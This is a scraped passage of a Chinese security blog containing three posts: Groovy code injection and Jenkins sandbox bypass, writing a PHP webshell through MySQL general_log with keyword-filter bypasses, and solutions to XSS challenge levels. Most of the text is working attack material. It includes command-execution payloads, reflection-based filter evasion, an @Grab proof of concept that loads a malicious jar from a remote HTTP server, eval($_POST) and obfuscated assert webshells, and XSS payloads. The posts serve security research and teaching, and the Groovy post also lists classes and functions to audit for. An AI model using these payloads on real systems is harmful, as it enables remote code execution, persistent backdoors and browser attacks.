&#125; return CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON(); // Approval requirements are managed by regular stapler form validation (via doCheckScript)&#125; 关键就是GroovyClassLoader.parseClass()，该方法只是进行AST解析但并未执行Groovy语句，即实际并没有execute()方法调用，而且真正执行Groovy代码时会遇到Groovy沙箱的限制。 如何解决这个问题来绕过Groovy沙箱呢？Orange给出了答案——借助编译时期的Meta Programming，其中提到了两种方法。 利用@ASTTest执行断言根据Groovy的Meta Programming手册，发现可利用`@groovy.transform.ASTTest`注解来实现在AST上执行一个断言。例如： 12@groovy.transform.ASTTest(value=&#123; assert Runtime.getRuntime().exec(\"calc\") &#125;)class Person&#123;&#125; 但在远程利用上会报错，原因在于Pipeline Shared Groovy Libraries Plugin这个插件，主要用于在PipeLine中引入自定义的函式库。Jenkins会在所有PipeLine执行前引入这个插件，而在编译阶段的ClassPath中并没有对应的函式库从而导致报错。 直接删掉这个插件是可以成功利用的，但由于该插件是随PipeLine默认安装的、因此这不是最优解。 利用@Grab远程加载恶意类@Grab注解的详细用法在Dependency management with Grape中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。例如： 123@GrabResolver(name='restlet', root='http://maven.restlet.org/')@Grab(group='org.restlet', module='org.restlet', version='1.1.6')import org.restlet 0x02 Groovy入门Groovy简介Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。 Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。 Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。） Groovy有以下特点： 同时支持静态和动态类型； 支持运算符重载； 本地语法列表和关联数组； 对正则表达式的本地支持； 各种标记语言，如XML和HTML原生支持； Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似； 可以使用现有的Java库； Groovy扩展了java.lang.Object； 基本语法参考：https://www.w3cschool.cn/groovy/ 环境搭建下载Groovy：http://groovy-lang.org/download.html 解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下： 12345class test &#123; static void main(args)&#123; println \"Hello World!\"; &#125;&#125; 5种运行方式groovyConsole图形交互控制台在终端下输入groovyConsole启动图形交互控制台，在上面可以直接编写代码执行： groovysh shell命令交互在终端下输入groovysh启动一个shell命令行来执行Groovy代码的交互： 用命令行执行Groovy脚本在GROOVY_HOME\\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似python test.py这种方式来执行Groovy脚本。 1.groovy： 1println(\"mi1k7ea\") 在Windows运行groovy.bat 1.groovy即可执行该Groovy脚本： 通过IDE运行Groovy脚本有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。 在前面的IDEA中可以直接运行Groovy脚本： 当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本： 1java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy 用Groovy创建Unix脚本你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。 编写一个类似如下的脚本文件，保存为：HelloGroovy 123#!/usr/bin/env groovyprintln(\"this is groovy script\")println(\"Hi,\"+args[0]+\" welcome to Groovy\") 然后在命令行下执行： 1234$ chmod +x HelloGroovy$ ./HelloGroovy micmiu.comthis is groovy scriptHi,micmiu.com welcome to Groovy 0x03 Groovy代码注入漏洞原理我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。 在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。 如下代码简单地执行命令： 123456class test &#123; static void main(args)&#123; def cmd = \"calc\"; println \"$&#123;cmd.execute()&#125;\"; &#125;&#125; 这段Groovy代码被执行就会弹计算器： 几种PoC变通形式Groovy代码注入实现命令执行有以下几种变通的形式： 1234567891011121314// 直接命令执行Runtime.getRuntime().exec(\"calc\")\"calc\".execute()'calc'.execute()\"$&#123;\"calc\".execute()&#125;\"\"$&#123;'calc'.execute()&#125;\"// 回显型命令执行println \"whoami\".execute().textprintln 'whoami'.execute().textprintln \"$&#123;\"whoami\".execute().text&#125;\"println \"$&#123;'whoami'.execute().text&#125;\"def cmd = \"whoami\";println \"$&#123;cmd.execute().text&#125;\"; 注入点在下面一些场景中，会触发Groovy代码注入漏洞。 GroovyShellGroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。 GroovyShellExample.java： 12345678import groovy.lang.GroovyShell;public class GroovyShellExample &#123; public static void main( String[] args ) &#123; GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(\"\\\"calc\\\".execute()\"); &#125;&#125; 直接运行即可弹计算器： 或者换成运行Groovy脚本的方式也是也一样的： 123456789101112import groovy.lang.GroovyShell;import groovy.lang.Script;import java.io.File;public class GroovyShellExample &#123; public static void main( String[] args ) throws Exception &#123; GroovyShell groovyShell = new GroovyShell(); Script script = groovyShell.parse(new File(\"src/test.groovy\")); script.run(); &#125;&#125; test.groovy： 1println \"whoami\".execute().text 此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。 GroovyScriptEngineGroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。 GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行： 123456789import groovy.lang.Binding;import groovy.util.GroovyScriptEngine;public class GroovyScriptEngineExample &#123; public static void main(String[] args) throws Exception &#123; GroovyScriptEngine groovyScriptEngine = new GroovyScriptEngine(\"\"); groovyScriptEngine.run(\"src/test.groovy\",new Binding()); &#125;&#125; test.groovy脚本文件如之前。 GroovyClassLoaderGroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。 GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行： 12345678910111213import groovy.lang.GroovyClassLoader;import groovy.lang.GroovyObject;import java.io.File;public class GroovyClassLoaderExample &#123; public static void main(String[] args) throws Exception &#123; GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class loadClass = groovyClassLoader.parseClass(new File(\"src/test.groovy\")); GroovyObject groovyObject = (GroovyObject) loadClass.newInstance(); groovyObject.invokeMethod(\"main\",\"\"); &#125;&#125; test.groovy脚本文件如之前。 ScriptEngineScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。 数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）； 脚本执行：脚本引擎执行表现为调用eval()； ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。 在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。 ScriptEngineExample.java，直接运行即命令执行： 123456789import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;public class ScriptEngineExample &#123; public static void main( String[] args ) throws Exception &#123; ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); groovyEngine.eval(\"\\\"calc\\\".execute()\"); &#125;&#125; 执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象： 12345678910111213141516171819202122import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;import java.io.BufferedReader;import java.io.FileReader;public class ScriptEngineExample &#123; public static void main( String[] args ) throws Exception &#123; ScriptEngine groovyEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); String code = readfile(\"src/test.groovy\"); groovyEngine.eval(code); &#125; public static String readfile(String filename) throws Exception &#123; BufferedReader in = new BufferedReader(new FileReader(filename)); String string = \"\"; String str; while ((str = in.readLine()) != null) &#123; string = string + str; &#125; return string; &#125;&#125; test.groovy脚本文件如之前。 0x04 Bypass Tricks利用反射机制和字符串拼接Bypass直接的命令执行在前面已经说过几种形式了： 1234567891011121314// 直接命令执行Runtime.getRuntime().exec(\"calc\")\"calc\".execute()'calc'.execute()\"$&#123;\"calc\".execute()&#125;\"\"$&#123;'calc'.execute()&#125;\"// 回显型命令执行println \"whoami\".execute().textprintln 'whoami'.execute().textprintln \"$&#123;\"whoami\".execute().text&#125;\"println \"$&#123;'whoami'.execute().text&#125;\"def cmd = \"whoami\";println \"$&#123;cmd.execute().text&#125;\"; 在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行： 12345import java.lang.reflect.Method;Class&lt;?&gt; rt = Class.forName(\"java.la\" + \"ng.Run\" + \"time\");Method gr = rt.getMethod(\"getR\" + \"untime\");Method ex = rt.getMethod(\"ex\" + \"ec\", String.class);ex.invoke(gr.invoke(null), \"ca\" + \"lc\") Groovy沙箱Bypass前面说到的Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了。这也是Orange大佬在绕过Groovy沙箱时用到的技巧。 @AST注解执行断言参考Groovy的Meta Programming手册，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。 PoC： 123456this.class.classLoader.parseClass(''' @groovy.transform.ASTTest(value=&#123; assert Runtime.getRuntime().exec(\"calc\") &#125;) def x'''); 本地测试： @Grab注解加载远程恶意类@Grab注解的详细用法在Dependency management with Grape中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。 编写恶意Exp类，命令执行代码写在其构造函数中： 12345678public class Exp &#123; public Exp()&#123; try &#123; java.lang.Runtime.getRuntime().exec(\"calc\"); &#125; catch (Exception e) &#123; &#125; &#125;&#125; 依次运行如下命令： 1234javac Exp.javamkdir -p META-INF/services/echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runnersjar cvf poc-0.jar Exp.class META-INF 先在Web根目录中新建/test/poc/0/目录，然后复制该jar包到该子目录下，接着开始HTTP服务。 PoC： 123456this.class.classLoader.parseClass(''' @GrabConfig(disableChecksums=true) @GrabResolver(name='Exp', root='http://127.0.0.1:8000/') @Grab(group='test', module='poc', version='0') import Exp;''') 运行，成功请求远程恶意Jar包并导入恶意Exp类执行其构造函数，从而导致RCE： 0x05 排查方法排查关键类函数特征： 关键类 关键函数 groovy.lang.GroovyShell evaluate groovy.util.GroovyScriptEngine run groovy.lang.GroovyClassLoader parseClass javax.script.ScriptEngine eval 0x06 参考Hacking Jenkins Part 1 - Play with Dynamic Routing Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE! Jenkins RCE分析（CVE-2018-1000861分析） Jenkins groovy scripts for read teamers and penetration testers","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://www.mi1k7ea.com/tags/Jenkins/"},{"name":"Groovy","slug":"Groovy","permalink":"https://www.mi1k7ea.com/tags/Groovy/"}]},{"title":"SQL语句利用日志写shell及相关绕过","date":"2020-07-19T09:17:28.000Z","path":"2020/07/19/SQL语句利用日志写shell及相关绕过/","text":"0x01 基本原理在能够写SQL语句的地方，outfile、dumpfile、drop database等都被禁止，一般进行SQL注入来getshell或删库的方式行不通了。 但是如果MySQL是root用户启动的，那么可以进行如下利用： 1234567show variables like '%general%'; #查看配置set global general_log = on; #开启general log模式set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址select '&lt;?php eval($_POST[cmd]);?&gt;' #写入shell SQL查询免杀shell的语句（参考：SQL语句利用日志写shell）： 1SELECT \"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;\" 0x02 Bypass案例这个案例虽然鸡肋，但是思路还可以。 过滤 .php代码审计某CMS时，看到一处写SQL语句的地方，此处之前报过漏洞，修复方案是过滤了outfile、dumpfile、drop database等，此外还过滤了.php字符串，为的就是防住SQL语句日志写shell： 12345678910111213141516if(stristr($sql, 'outfile'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'; break;&#125;if(stristr($sql, 'dumpfile'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'; break;&#125;if(stristr($sql, '.php'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'; break;&#125;if(preg_match(\"/^drop(.*)database/i\", $sql))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'; break;&#125; 这里直接写上述的SQL语句肯定是不行的，因为set global general_log_file = &#39;/var/www/html/1.php&#39;;的.php会被过滤掉。 这里只是针对字符串的检测，可以用字符串拼接的方式Bypass，这里可以使用SQL语句中的concat家族系列函数来实现字符串拼接来Bypass： 1234567show variables like '%general%'; #查看配置set global general_log = on; #开启general log模式set global general_log_file =CONCAT(\"/var/www/html/1.\",\"php\"); select '&lt;?php eval($_POST[cmd]);?&gt;'; #写入shell 过滤 .php和concat在这次报过的漏洞之后，CMS厂商修改了这个洞，就是添加了对concat的字符串过滤，这样concat家族系列函数就使不上了。 1234567891011121314151617181920if(stristr($sql, 'outfile'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'; break;&#125;if(stristr($sql, 'dumpfile'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'; break;&#125;if(stristr($sql, '.php'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'; break;&#125;if(stristr($sql, 'concat'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “concat” ！&lt;/span&gt;'; break;&#125;if(preg_match(\"/^drop(.*)database/i\", $sql))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'; break;&#125; 使用concat进行字符串拼接的方式没法绕过了，但是除了字符串拼接，我们还能使用字符串替换的操作来绕过： 1234567show variables like '%general%'; #查看配置set global general_log = on; #开启general log模式set global general_log_file =REPLACE(\"/var/www/html/1.jpg\",\"jpg\",\"php\"); select '&lt;?php eval($_POST[cmd]);?&gt;'; #写入shell 过滤 .php、concat和replaceCMS厂商收到新的绕过漏洞报告后，又进行新一轮的修复，过滤了replace： 123456789101112131415161718192021222324if(stristr($sql, 'outfile'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;'; break;&#125;if(stristr($sql, 'dumpfile'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “dumpfile”！&lt;/span&gt;'; break;&#125;if(stristr($sql, '.php'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;'; break;&#125;if(stristr($sql, 'concat'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “concat” ！&lt;/span&gt;'; break;&#125;if(stripos($sql, 'replace'))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 检测到非法字符 “replace” ！&lt;/span&gt;'; break;&#125;if(preg_match(\"/^drop(.*)database/i\", $sql))&#123; $str = '&lt;span class=\"c-red\"&gt;ERROR : 不允许删除数据库！&lt;/span&gt;'; break;&#125; 字符串拼接和替换都不能成功进行利用了，还有啥办法不？ 当然还有新的Bypass方法哈哈。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.mi1k7ea.com/tags/SQL注入/"}]},{"title":"一些BAT的XSS实例","date":"2020-07-11T08:04:07.000Z","path":"2020/07/11/一些BAT的XSS实例/","text":"0x00 前言根据N年前的BAT的XSS实例出的10道题目，弹1即可成功。 题目地址时从xsstest1~xsstest10： http://px1624.sinaapp.com/test/xsstest1/ 参考答案：一些BAT的XSS实例（一） 0x01 xsstest1题目地址：http://px1624.sinaapp.com/test/xsstest1/ 查看源码： 123456&lt;script type=\"text/javascript\"&gt;var x=location.hash;function aa(x)&#123;&#125;;setTimeout(\"aa('\"+x+\"')\",100);&lt;/script&gt;Give me xss bypass 1~ 这就是一个典型的DOM型XSS。这里source点是location.hash，即获取URL的锚部分（从#号开始的部分），sink点是setTimeout()。 关键绕过点在于闭合引号和括号即可。 下面看3种常用的构造方法。 更多的JS调试技巧可参考：https://www.toolmao.com/342.html 方法一：分析代码并在Console中构造调试先来看下setTimeout()方法。 setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。 语法格式可以是以下两种： 12setTimeout(要执行的代码, 等待的毫秒数)setTimeout(JavaScript 函数, 等待的毫秒数) 我们正常弹框是这样的： 123setTimeout(\"alert(1)\",0)或setTimeout(alert(1),0) 根据当前场景，给出一些可在Chrome Console中运行弹框的样式： 12345678setTimeout(\"aa('',alert(1),'')\",0) // 利用闭合setTimeout(\"aa('');alert('1')\",0) // 利用闭合setTimeout(\"aa('');alert(1)//')\",0) // 利用注释// 等价于setTimeout(\"aa('\"+\"',alert(1),'\"+\"')\",0) // 利用闭合setTimeout(\"aa('\"+\"');alert('1\"+\"')\",0) // 利用闭合setTimeout(\"aa('\"+\"');alert(1)//\"+\"')\",0) // 利用注释 直接给出一些构造成功的payload： 123#&apos;,alert(1),&apos;#&apos;);alert(&apos;1#&apos;);alert(1)// 方法二：JavaScript断点调试就是在Chrome的Console中打断点看当前变量值。 方法三：基于报错的JS调试即故意输入特殊字符，导致JS语法错误，从而可以根据错误信息去构造我们的payload。 0x02 xsstest2题目地址：http://px1624.sinaapp.com/test/xsstest2/ 查看源码： 12345678910111213141516171819&lt;html&gt;&lt;head&gt;&lt;script src=\"./jquery-3.4.1.min.js\"&gt;&lt;/script&gt;Give me xss bypass 2~&lt;div style='display:none' id='xx'&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/div&gt;&lt;input type='button' value='test' onclick='alert(\"鍝堝搱锛岀偣杩欑帺鎰忔病鍟ョ敤鐨勶紒\")'&gt;&lt;body&gt;&lt;script&gt; var query = window.location.search.substring(1); var vars = query.split(\"&amp;\"); if(vars)&#123; aa(vars[0],vars[1]) &#125; function aa(x,y)&#123; $(\"#xx\")[x]($(\"#xx\")[y]()); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 同样是DOM型XSS。这里window.location.search是从问号 (?) 开始的 URL（查询部分），然后以’&amp;’符切分内容，最后将传入的前两个参数传到$(&quot;#xx&quot;)[x]($(&quot;#xx&quot;)[y]());中执行。 我们知道，常见的JQuery操作DOM的形式为： 1234567891011121314151617181920/* text() - 设置或返回所选元素的文本内容 html() - 设置或返回所选元素的内容（包括 HTML 标记） val() - 设置或返回表单字段的值*/$(document).ready(function() &#123; $(\"#btn1\").click(function() &#123; alert(\"值为: \" + $(\"#test1\").text()); &#125;); $(\"#btn2\").click(function() &#123; alert(\"值为: \" + $(\"#test1\").html()); &#125;); $(\"#btn3\").click(function() &#123; alert(\"值为: \" + $(\"#test2\").val()); &#125;); $(\"#btn4\").click(function() &#123; alert(\"值为：\" + $(\"#test3\").attr(\"href\")); &#125;);&#125;); 更多的方法可参考：https://m.jb51.net/article/39099.htm 网上一个总结图： 而上面执行的位置就是对id为xx的标签进行了两次DOM操作。我们知道前面img标签处是被HTML编码了，这里就涉及到一个点，就是text()函数会把HTML编码后的代码给解码回来。 测试下就知道了： payload如下，第二个参数必须是text，第一个参数则可以是其他的一些可触发的方法即可： 123456789?html&amp;text?prepend&amp;text?append&amp;text?before&amp;text?after&amp;text?constructor&amp;text?appendTo&amp;text?insertBefore&amp;text?insertAfter&amp;text 0x03 xsstest3题目地址：http://px1624.sinaapp.com/test/xsstest3/ 查看源码： 12345678910Give me xss bypass 3~&lt;script src=\"./jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;script&gt; $(function test() &#123; var px = ''; if (px != \"\") &#123; $('xss').val(''); &#125; &#125;)&lt;/script&gt; 一看没输入点，应该是后台的代码看不到，比如PHP写的。 这里就推测下JS的px变量是不是就是输入参数： 虽然推测出变量px，但经过折腾发现会过滤&lt;、&gt;等特殊字符，且很多闭合的尝试都没成功弹框，原因都在于两处的输入点导致语法不满足就会报错。 后面看了wp，考察点是JavaScript字符串运算符。 payload如下，除了加减乘除，其他的运算符都可以（可参考https://www.w3school.com.cn/js/js_operators.asp）： 1234?px=&apos;*alert(1)*&apos;?px=%27%2Balert(1)%2B%27?px=%27-alert(1)-%27?px=%27/alert(1)/%27 最后看下作者的源码： 0x04 xsstest4题目地址：http://px1624.sinaapp.com/test/xsstest4/ 查看源码： 12345678910Give me xss bypass 4~&lt;script src=\"./jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;script&gt; $(function test() &#123; var px = ''; if (px != \"\") &#123; $('xss').val(''); &#125; &#125;)&lt;/script&gt; 和第三关是一样的，也是px参数，但是将常见运算符这些都过滤了： 然而，因为出题人的疏忽，漏掉了一些运算符，如instanceof、in： 12?px=%27instanceof%20alert(1)instanceof%20%27?px=%27in%20alert(1)in%20%27 作者的预期解法 这个同步输出的问题，导致我们没有办法直接通过注释符来实现，因为同步输出会导致语法错误，并且这里还过滤了/符号。既然这样，就只能寻找一些前后闭合都一样的来构造，首先想到的是单双引号，这个能够实现将中间部分作为字符串来解析： 但是问题在于，JavaScript中单引号和双引号这样的字符串中间是不能换行的，如果要换行就必须得在行末尾进行转义： 但是此处场景的行末尾不是我们可控的，显然无法在末尾写入\\。 解题关键在于JavaScript模板字符串： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings 模板字符串中间是可以包含换行的，所以只需要使用模板字符串将中间部分变为字符串解析就可以了。 测试看看，在同步输出的场景确实能够进行闭合字符串利用： payload如下，注意闭合因为注释掉中间部分剩下后面的)和}： 1?px=&apos;;`;&#123;alert(&apos;1 最后看下作者的源码，就是在第三关的基础上加上了对几乎所有JS运算符的过滤： 0x05 xsstest5题目地址：http://px1624.sinaapp.com/test/xsstest5/ 此题直接访问时看不到源码的，会直接跳转到访问JSONP接口/user.php?callback=Give me xss bypass~，将callback参数的内容直接返回到页面中。 用Burp看到，JSONP接口响应的Content-Type为text/javascript，弹框是没戏的，考察点不在这里，在之前的《JSONP跨域漏洞总结》中有提到过： 回过来，看源码还是有办法的，直接访问view-source:http://px1624.sinaapp.com/test/xsstest5/即可： 12345678910111213141516&lt;html&gt;&lt;script src=\"../jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;Script src=\"./index.js\"&gt;&lt;/Script&gt;&lt;head&gt;&lt;script type=\"text/javascript\"&gt;var orguin = $.Tjs_Get('uin');var pagenum= $.Tjs_Get('pn');if(orguin&lt;=0) window.location=\"./user.php?callback=Give me xss bypass~\";document.write('&lt;script type=\"text/javascript\" src=\"http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'\"&gt;&lt;\\/script&gt;');&lt;/script&gt;&lt;/head&gt;&lt;body&gt;Give me xss bypass 5~&lt;/body&gt;&lt;/html&gt; 这里有个JQuery的Tjs_Get()方法，但是不知道具体定义实现，看到有引入index.js，下载该文件全局搜索，关键代码如下： 1234567891011121314151617181920212223242526272829303132333435/*...Tjs_Get 得到地址栏中的参数值 变量分大小写...*/ // 得到地址栏中的参数值 变量分大小写 Tjs_Get:function(parmtname)&#123; //var SERVER_TEMP = $.Tjs_HtmlEncode(window.location.search.replace(/.*\\?/,\"\")); //HtmlEncode 进行安全验证 var sl = location.href.indexOf('&amp;'); var hl = location.href.indexOf('#'); var str = ''; if ((sl &lt; 0 || sl &gt; hl) &amp;&amp; hl &gt; 0) str = location.hash.substr(1); else str = location.search.substr(1); str=str.replace(/%/g,\"\"); //var SERVER_TEMP = str; var SERVER_TEMP = $.Tjs_HtmlEncode(str.replace(/.*\\?/,\"\")); //HtmlEncode 进行安全验证 var PAGE_PARMT_ARRAY = SERVER_TEMP.split(\"&amp;amp;\"); if(PAGE_PARMT_ARRAY.length==0) return \"\"; var value=\"\"; for(var i=0;i&lt;PAGE_PARMT_ARRAY.length;i++)&#123; if(PAGE_PARMT_ARRAY[i]==\"\") continue; var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf(\"=\")); if(GETname == parmtname)&#123; value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(\"=\")+1),PAGE_PARMT_ARRAY[i].length); return value; break; &#125; &#125; return \"\"; &#125;, 简单点说，就是获取GET方式传入的参数而已。 回到源码处，有个document.write()的DOM操作，其中分别将uin和pn参数的值分别作为script标签src属性值URL的路径和参数部分传入。前面知道JSONP接口传入啥返回JS类的啥，比如http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)： 这样就可以利用这个接口来构造如下payload： 1?uin=test/xsstest5/user.php&amp;pn=callback=alert(1) 0x06 xsstest6（boss）题目地址：http://px1624.sinaapp.com/test/xsstest6/ 和第五关类似，有个JSONP接口，查看源码： 123456789101112131415&lt;html&gt;&lt;script src=\"../jquery-3.4.1.min.js\"&gt;&lt;/script&gt;&lt;Script src=\"./index.js\"&gt;&lt;/Script&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;script type=\"text/javascript\"&gt;var orguin = $.Tjs_Get('uin');if(orguin&lt;=0) window.location=\"./user.php?callback=\";document.write('&lt;script type=\"text/javascript\" src=\"http://px1624.sinaapp.com/pxpath/'+decodeURIComponent(orguin)+'&amp;'+Math.random()+'\"&gt;&lt;\\/script&gt;');&lt;/script&gt;&lt;/head&gt;&lt;body&gt;Give me xss bypass 6~【任意浏览器弹1就算通过】&lt;/body&gt;&lt;/html&gt; 只有一个输入点即uin参数，如果该参数不为空则进行DOM操作写入script标签的src属性值的url路径中拼接起来，期间做了次URL解码操作。 这题公认最难，具体分析过程参考：https://mp.weixin.qq.com/s/MNP1PW0bi0aL7dRr1aa2Tg 这里直接给出payload，仅在旧版Chrome中生效，新版的对location.hash的特殊字符也进行了URL编码，所以导致\\u2028和\\u2029这种换行符的解析失效，从而不能用： 12?#11?\\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)?#11?\\u2029&amp;uin=../test/xsstest5/user.php?callback=alert(1) 简单地说，目的很简单，就是写入?uid=，但是问号?和百分号%在index.js中被过滤了，此时就可以应用换行符来进行绕过正则的过滤。但是\\n和\\r这些换行符在浏览器中输入会被自动进行URL编码再发起请求导致%被过滤所以无法成功。但除了前面两个换行符，在JS中还支持\\u2028和\\u2029这两个。此外，JSONP接口中限制了字符长度不能大于7个字符，alert(1)是8个字符，所以直接写是不行的。这里有两种思路，一是利用第五题的JSONP接口alert(1)，另一种是利用name进行传参，然后利用jq的domxss的特性，进行构造。 0x07 xsstest7题目地址：http://px1624.sinaapp.com/test/xsstest7/ 查看源码： 123456789&lt;script&gt;var px='';&lt;/script&gt;give me xss by pass~7&lt;div style=\"display:none\"&gt;&lt;/div&gt;&lt;!--px--&gt;&lt;script&gt;'px'&lt;/script&gt; 推测出px参数。尝试前面的方法发现注释符被转义了，没法直接在第一个script标签处完成弹框： 很多人似乎想到第四题，我们可以不可以把其中一部分内容当做模板字符串，但是你会发现还是有区别的，因为第四题的输出点2个位置都在js环境里，而这里是一个在js中一个在html中，所以直接这样肯定是不行的，因为不管你怎么构造，你都会发现script标签里的输出部分最后面的这个单引号没办法解决。 通过测试发现，JS和HTML两个输出点处理的不一样，JS输出点是对特殊字符进行转义，而HTML输出点是进行了HTML实体编码： 题目考察点肯定和前面不同。观察到这里源码中有个&lt;!--px--&gt;和&lt;script&gt;&#39;px&#39;&lt;/script&gt;，看似无用，其实就是出题人的疯狂暗示。这就是考察点：https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/ 简单地说，在script标签里面如果遇到了 &lt;!--那么这个的解析优先级会变成最高，如果这个后面再出现 &lt;script&gt; 标签，那么最近的另一个&lt;/script&gt;标签就会优先去先闭合这个，从而打破了原先跳不出script标签限制的这个点。 这里尝试一下，由于script标签的尖括号被过滤，所以我们在后面加个空格即可、不影响成功解析： 